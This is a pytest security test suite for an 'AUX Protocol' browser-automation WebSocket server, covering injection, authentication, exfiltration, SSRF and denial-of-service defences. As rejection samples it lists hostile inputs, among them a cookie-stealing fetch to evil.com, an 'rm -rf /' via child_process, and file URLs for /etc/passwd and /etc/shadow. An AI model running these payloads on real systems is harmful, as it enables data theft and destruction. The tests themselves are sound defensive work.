"""
Comprehensive security vulnerability tests for AUX Protocol.

Tests cover common web security vulnerabilities, input validation,
injection attacks, and security best practices enforcement.
"""

import asyncio
import pytest
import json
import base64
import hashlib
from typing import Dict, Any, List
from unittest.mock import Mock, AsyncMock, patch

from aux.client.sdk import AUXClient
from aux.server.websocket_server import AUXWebSocketServer
from aux.security import SecurityManager
from aux.config import Config


@pytest.mark.security
class TestInputValidationVulnerabilities:
    """Test input validation and sanitization vulnerabilities."""
    
    @pytest.fixture
    async def security_test_setup(self, test_config, malicious_inputs):
        """Set up security testing environment."""
        # Enable strict security
        security_config = test_config.security_config
        security_config.enable_auth = True
        security_config.input_validation = True
        security_config.sanitize_inputs = True
        
        security_manager = SecurityManager(security_config)
        server = AUXWebSocketServer(test_config, security_manager)
        
        await server.start()
        
        client = AUXClient(
            url=f"ws://{server.host}:{server.port}",
            api_key="security-test-key"
        )
        
        yield {
            "server": server,
            "client": client,
            "security_manager": security_manager,
            "malicious_inputs": malicious_inputs
        }
        
        if client.connected:
            await client.disconnect()
        await server.stop()
        
    async def test_javascript_injection_prevention(self, security_test_setup):
        """Test prevention of JavaScript injection attacks."""
        setup = security_test_setup
        client = setup["client"]
        malicious_inputs = setup["malicious_inputs"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Navigate to test page
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": "data:text/html,<input id='test-input' type='text'>"
            }
        )
        
        # Test JavaScript injection in fill command
        for malicious_js in malicious_inputs["javascript_injection"]:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "fill",
                    "selector": "#test-input",
                    "value": malicious_js
                }
            )
            
            # Should either sanitize the input or reject the command
            if response["status"] == "success":
                # If accepted, verify it was sanitized
                extract_response = await client.execute_command(
                    session_id=session_id,
                    command={
                        "method": "extract",
                        "selector": "#test-input",
                        "extract_type": "attribute",
                        "attribute": "value"
                    }
                )
                
                if extract_response["status"] == "success":
                    actual_value = extract_response["result"]["extracted_attribute"]
                    # Malicious script tags should be sanitized
                    assert "<script>" not in actual_value
                    assert "javascript:" not in actual_value
                    
            elif response["status"] == "error":
                # Input was rejected - this is acceptable
                assert "SECURITY_VIOLATION" in response["error"]["error_code"]
                
        await client.close_session(session_id)
        
    async def test_css_injection_prevention(self, security_test_setup):
        """Test prevention of CSS injection attacks."""
        setup = security_test_setup
        client = setup["client"]
        malicious_inputs = setup["malicious_inputs"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Test CSS injection in navigation URL
        for malicious_css in malicious_inputs["css_injection"]:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "navigate",
                    "url": malicious_css
                }
            )
            
            # Should reject malicious CSS URLs
            assert response["status"] == "error"
            assert "SECURITY_VIOLATION" in response["error"]["error_code"]
            
        await client.close_session(session_id)
        
    async def test_sql_injection_prevention(self, security_test_setup):
        """Test prevention of SQL injection patterns in inputs."""
        setup = security_test_setup
        client = setup["client"]
        malicious_inputs = setup["malicious_inputs"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": "data:text/html,<input id='sql-input' type='text'>"
            }
        )
        
        # Test SQL injection patterns in fill command
        for sql_injection in malicious_inputs["sql_injection"]:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "fill",
                    "selector": "#sql-input",
                    "value": sql_injection
                }
            )
            
            # Should sanitize or reject SQL injection patterns
            if response["status"] == "success":
                extract_response = await client.execute_command(
                    session_id=session_id,
                    command={
                        "method": "extract",
                        "selector": "#sql-input",
                        "extract_type": "attribute",
                        "attribute": "value"
                    }
                )
                
                if extract_response["status"] == "success":
                    actual_value = extract_response["result"]["extracted_attribute"]
                    # Dangerous SQL patterns should be sanitized
                    assert "DROP TABLE" not in actual_value.upper()
                    assert "DELETE FROM" not in actual_value.upper()
                    
        await client.close_session(session_id)
        
    async def test_path_traversal_prevention(self, security_test_setup):
        """Test prevention of path traversal attacks."""
        setup = security_test_setup
        client = setup["client"]
        malicious_inputs = setup["malicious_inputs"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Test path traversal in navigation URLs
        for path_traversal in malicious_inputs["path_traversal"]:
            malicious_url = f"file://{path_traversal}"
            
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "navigate",
                    "url": malicious_url
                }
            )
            
            # Should reject path traversal attempts
            assert response["status"] == "error"
            assert "SECURITY_VIOLATION" in response["error"]["error_code"]
            
        await client.close_session(session_id)
        
    async def test_oversized_input_handling(self, security_test_setup):
        """Test handling of oversized inputs (DoS protection)."""
        setup = security_test_setup
        client = setup["client"]
        malicious_inputs = setup["malicious_inputs"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": "data:text/html,<textarea id='large-input'></textarea>"
            }
        )
        
        # Test oversized inputs
        for oversized_input in malicious_inputs["oversized_input"]:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "fill",
                    "selector": "#large-input",
                    "value": oversized_input
                }
            )
            
            # Should either limit input size or reject
            if response["status"] == "error":
                assert "INPUT_TOO_LARGE" in response["error"]["error_code"]
            else:
                # If accepted, verify it was truncated
                extract_response = await client.execute_command(
                    session_id=session_id,
                    command={
                        "method": "extract",
                        "selector": "#large-input",
                        "extract_type": "attribute",
                        "attribute": "value"
                    }
                )
                
                if extract_response["status"] == "success":
                    actual_value = extract_response["result"]["extracted_attribute"]
                    # Should be truncated to reasonable size
                    assert len(actual_value) < 100000  # 100KB limit
                    
        await client.close_session(session_id)


@pytest.mark.security
class TestAuthenticationVulnerabilities:
    """Test authentication and authorization vulnerabilities."""
    
    async def test_api_key_validation(self, test_config):
        """Test API key validation and security."""
        security_config = test_config.security_config
        security_config.enable_auth = True
        security_config.api_keys = ["valid-key-123", "another-valid-key"]
        
        security_manager = SecurityManager(security_config)
        server = AUXWebSocketServer(test_config, security_manager)
        
        await server.start()
        
        try:
            # Test with valid API key
            valid_client = AUXClient(
                url=f"ws://{server.host}:{server.port}",
                api_key="valid-key-123"
            )
            
            await valid_client.connect()
            session_response = await valid_client.create_session()
            assert session_response["status"] == "success"
            await valid_client.close_session(session_response["session_id"])
            await valid_client.disconnect()
            
            # Test with invalid API key
            invalid_keys = [
                "invalid-key",
                "",
                "valid-key-12",  # Partial match
                "valid-key-123-extra",  # Extended valid key
                "VALID-KEY-123",  # Case variation
                "\x00valid-key-123",  # Null byte injection
                "valid-key-123\n",  # Newline injection
            ]
            
            for invalid_key in invalid_keys:
                invalid_client = AUXClient(
                    url=f"ws://{server.host}:{server.port}",
                    api_key=invalid_key
                )
                
                with pytest.raises(Exception):
                    await invalid_client.connect()
                    await invalid_client.create_session()
                    
        finally:
            await server.stop()
            
    async def test_session_hijacking_prevention(self, test_config):
        """Test prevention of session hijacking attacks."""
        security_config = test_config.security_config
        security_config.enable_auth = True
        security_config.session_security = True
        
        security_manager = SecurityManager(security_config)
        server = AUXWebSocketServer(test_config, security_manager)
        
        await server.start()
        
        try:
            client1 = AUXClient(
                url=f"ws://{server.host}:{server.port}",
                api_key="client1-key"
            )
            
            client2 = AUXClient(
                url=f"ws://{server.host}:{server.port}",
                api_key="client2-key"
            )
            
            await client1.connect()
            await client2.connect()
            
            # Client 1 creates session
            session_response = await client1.create_session()
            session_id = session_response["session_id"]
            
            # Client 1 uses session successfully
            response1 = await client1.execute_command(
                session_id=session_id,
                command={
                    "method": "navigate",
                    "url": "data:text/html,<div>Client 1 Page</div>"
                }
            )
            assert response1["status"] == "success"
            
            # Client 2 tries to use Client 1's session (should fail)
            response2 = await client2.execute_command(
                session_id=session_id,
                command={
                    "method": "extract",
                    "selector": "div",
                    "extract_type": "text"
                }
            )
            
            assert response2["status"] == "error"
            assert "UNAUTHORIZED" in response2["error"]["error_code"]
            
            await client1.close_session(session_id)
            await client1.disconnect()
            await client2.disconnect()
            
        finally:
            await server.stop()
            
    async def test_brute_force_protection(self, test_config):
        """Test brute force attack protection."""
        security_config = test_config.security_config
        security_config.enable_auth = True
        security_config.brute_force_protection = True
        security_config.max_failed_attempts = 3
        security_config.lockout_duration = 60  # seconds
        
        security_manager = SecurityManager(security_config)
        server = AUXWebSocketServer(test_config, security_manager)
        
        await server.start()
        
        try:
            # Attempt multiple connections with invalid keys
            for attempt in range(5):
                invalid_client = AUXClient(
                    url=f"ws://{server.host}:{server.port}",
                    api_key=f"invalid-key-{attempt}"
                )
                
                try:
                    await invalid_client.connect()
                    await invalid_client.create_session()
                    # Should fail
                    assert False, "Should have failed authentication"
                except Exception as e:
                    # Expected failure
                    if attempt >= 3:
                        # Should be locked out
                        assert "locked out" in str(e).lower() or "rate limit" in str(e).lower()
                        
        finally:
            await server.stop()


@pytest.mark.security
class TestDataExfiltrationPrevention:
    """Test prevention of data exfiltration attacks."""
    
    async def test_sensitive_data_filtering(self, security_test_setup):
        """Test filtering of sensitive data in responses."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Create page with sensitive-looking data
        sensitive_html = """
        <html>
        <body>
            <div id="credit-card">4532-1234-5678-9012</div>
            <div id="ssn">123-45-6789</div>
            <div id="password">password123</div>
            <input type="password" id="pass-input" value="secret123">
            <div id="api-key">sk-1234567890abcdef</div>
        </body>
        </html>
        """
        
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": f"data:text/html,{sensitive_html}"
            }
        )
        
        # Try to extract credit card data
        cc_response = await client.execute_command(
            session_id=session_id,
            command={
                "method": "extract",
                "selector": "#credit-card",
                "extract_type": "text"
            }
        )
        
        if cc_response["status"] == "success":
            # Should be redacted or filtered
            extracted_text = cc_response["result"]["extracted_text"]
            assert "****" in extracted_text or extracted_text == "[REDACTED]"
            
        # Try to extract password field
        pass_response = await client.execute_command(
            session_id=session_id,
            command={
                "method": "extract",
                "selector": "#pass-input",
                "extract_type": "attribute",
                "attribute": "value"
            }
        )
        
        if pass_response["status"] == "success":
            # Password values should be redacted
            extracted_value = pass_response["result"]["extracted_attribute"]
            assert extracted_value != "secret123"
            assert "***" in extracted_value or extracted_value == "[REDACTED]"
            
        await client.close_session(session_id)
        
    async def test_file_access_prevention(self, security_test_setup):
        """Test prevention of unauthorized file access."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Test file:// URL access
        file_urls = [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///Windows/System32/config/SAM",
            "file://C:/Windows/System32/drivers/etc/hosts",
            "file:///proc/version",
            "file:///dev/urandom"
        ]
        
        for file_url in file_urls:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "navigate",
                    "url": file_url
                }
            )
            
            # Should reject file:// URLs
            assert response["status"] == "error"
            assert "SECURITY_VIOLATION" in response["error"]["error_code"]
            
        await client.close_session(session_id)
        
    async def test_network_request_filtering(self, security_test_setup):
        """Test filtering of unauthorized network requests."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Test navigation to restricted URLs
        restricted_urls = [
            "http://169.254.169.254/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://localhost:22/",  # SSH port
            "http://127.0.0.1:3306/",  # MySQL port
            "ftp://anonymous@ftp.example.com/",  # FTP protocol
            "data:text/html,<script>fetch('http://evil.com')</script>"
        ]
        
        for url in restricted_urls:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "navigate",
                    "url": url
                }
            )
            
            # Should reject or filter dangerous URLs
            if "localhost" in url or "127.0.0.1" in url or "169.254" in url:
                assert response["status"] == "error"
                assert "SECURITY_VIOLATION" in response["error"]["error_code"]
                
        await client.close_session(session_id)


@pytest.mark.security
class TestCodeInjectionPrevention:
    """Test prevention of code injection attacks."""
    
    async def test_script_evaluation_security(self, security_test_setup):
        """Test security of script evaluation functionality."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": "data:text/html,<div id='test'>Test Content</div>"
            }
        )
        
        # Test malicious script evaluation
        malicious_scripts = [
            "fetch('http://evil.com/steal?data=' + document.cookie)",
            "localStorage.clear(); sessionStorage.clear();",
            "document.body.innerHTML = '<iframe src=http://evil.com></iframe>';",
            "eval('alert(1)');",
            "Function('return process')().exit();",
            "require('child_process').exec('rm -rf /');",
            "window.location = 'http://evil.com';"
        ]
        
        for script in malicious_scripts:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "evaluate",
                    "script": script
                }
            )
            
            # Should reject malicious scripts
            assert response["status"] == "error"
            assert "SECURITY_VIOLATION" in response["error"]["error_code"]
            
        # Test safe script evaluation
        safe_response = await client.execute_command(
            session_id=session_id,
            command={
                "method": "evaluate",
                "script": "document.getElementById('test').textContent"
            }
        )
        
        # Safe scripts should work
        assert safe_response["status"] == "success"
        assert safe_response["result"] == "Test Content"
        
        await client.close_session(session_id)
        
    async def test_selector_injection_prevention(self, security_test_setup):
        """Test prevention of CSS selector injection."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": "data:text/html,<div id='target'>Target</div>"
            }
        )
        
        # Test malicious selectors
        malicious_selectors = [
            "div[onclick*='alert']",
            "*:not(:not(*))",  # Performance attack
            "div { background: url('javascript:alert(1)') }",
            "@import 'http://evil.com/styles.css';",
            "\\0000003C script\\0000003E alert(1)\\0000003C /script\\0000003E",
        ]
        
        for selector in malicious_selectors:
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "click",
                    "selector": selector
                }
            )
            
            # Should reject malicious selectors
            assert response["status"] == "error"
            assert "INVALID_SELECTOR" in response["error"]["error_code"]
            
        await client.close_session(session_id)


@pytest.mark.security
class TestDenialOfServicePrevention:
    """Test prevention of Denial of Service attacks."""
    
    async def test_resource_exhaustion_prevention(self, security_test_setup):
        """Test prevention of resource exhaustion attacks."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        
        # Test session creation limits
        sessions = []
        max_attempts = 20
        
        for i in range(max_attempts):
            response = await client.create_session()
            if response["status"] == "success":
                sessions.append(response["session_id"])
            else:
                # Should hit resource limit
                assert "RESOURCE_LIMIT" in response["error"]["error_code"]
                break
                
        # Should not be able to create unlimited sessions
        assert len(sessions) < max_attempts
        
        # Cleanup
        for session_id in sessions:
            try:
                await client.close_session(session_id)
            except:
                pass
                
    async def test_command_rate_limiting(self, security_test_setup):
        """Test command rate limiting."""
        setup = security_test_setup
        client = setup["client"]
        
        # Configure strict rate limiting
        setup["security_manager"].config.rate_limit_per_minute = 10
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": "data:text/html,<div>Test</div>"
            }
        )
        
        # Rapid fire commands
        successful_commands = 0
        rate_limited = False
        
        for i in range(20):
            response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "extract",
                    "selector": "div",
                    "extract_type": "text"
                }
            )
            
            if response["status"] == "success":
                successful_commands += 1
            else:
                if "RATE_LIMIT" in response["error"]["error_code"]:
                    rate_limited = True
                    break
                    
        # Should hit rate limit
        assert rate_limited or successful_commands <= 10
        
        await client.close_session(session_id)
        
    async def test_memory_bomb_prevention(self, security_test_setup):
        """Test prevention of memory exhaustion attacks."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Try to create massive content that could exhaust memory
        memory_bomb_html = "<div>" + "A" * 10000000 + "</div>"  # 10MB string
        
        response = await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": f"data:text/html,{memory_bomb_html}"
            }
        )
        
        # Should reject or limit oversized content
        if response["status"] == "error":
            assert "CONTENT_TOO_LARGE" in response["error"]["error_code"]
        else:
            # If accepted, subsequent operations should still work
            test_response = await client.execute_command(
                session_id=session_id,
                command={
                    "method": "extract",
                    "selector": "div",
                    "extract_type": "text"
                }
            )
            # Should not crash the system
            assert test_response["status"] in ["success", "error"]
            
        await client.close_session(session_id)


@pytest.mark.security
class TestSecurityHeaders:
    """Test security headers and configurations."""
    
    async def test_websocket_security_headers(self, test_config):
        """Test WebSocket security headers and configurations."""
        security_config = test_config.security_config
        security_config.enable_auth = True
        security_config.csrf_protection = True
        security_config.cors_enabled = True
        security_config.allowed_origins = ["https://trusted.com"]
        
        security_manager = SecurityManager(security_config)
        server = AUXWebSocketServer(test_config, security_manager)
        
        await server.start()
        
        try:
            # Test connection from allowed origin
            allowed_client = AUXClient(
                url=f"ws://{server.host}:{server.port}",
                api_key="test-key",
                headers={"Origin": "https://trusted.com"}
            )
            
            await allowed_client.connect()
            session_response = await allowed_client.create_session()
            assert session_response["status"] == "success"
            await allowed_client.close_session(session_response["session_id"])
            await allowed_client.disconnect()
            
            # Test connection from disallowed origin
            disallowed_client = AUXClient(
                url=f"ws://{server.host}:{server.port}",
                api_key="test-key",
                headers={"Origin": "https://malicious.com"}
            )
            
            with pytest.raises(Exception):
                await disallowed_client.connect()
                
        finally:
            await server.stop()
            
    async def test_content_security_policy(self, security_test_setup):
        """Test Content Security Policy enforcement."""
        setup = security_test_setup
        client = setup["client"]
        
        await client.connect()
        session_response = await client.create_session()
        session_id = session_response["session_id"]
        
        # Test navigation to page with CSP violations
        csp_violating_html = """
        <html>
        <head>
            <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
        </head>
        <body>
            <script src="http://evil.com/malicious.js"></script>
            <img src="http://tracker.com/pixel.gif">
            <iframe src="http://ads.com/banner"></iframe>
        </body>
        </html>
        """
        
        response = await client.execute_command(
            session_id=session_id,
            command={
                "method": "navigate",
                "url": f"data:text/html,{csp_violating_html}"
            }
        )
        
        # Navigation should succeed but CSP should block malicious content
        assert response["status"] == "success"
        
        # Check that external resources were blocked
        # (This would require checking browser console logs or network requests)
        
        await client.close_session(session_id)
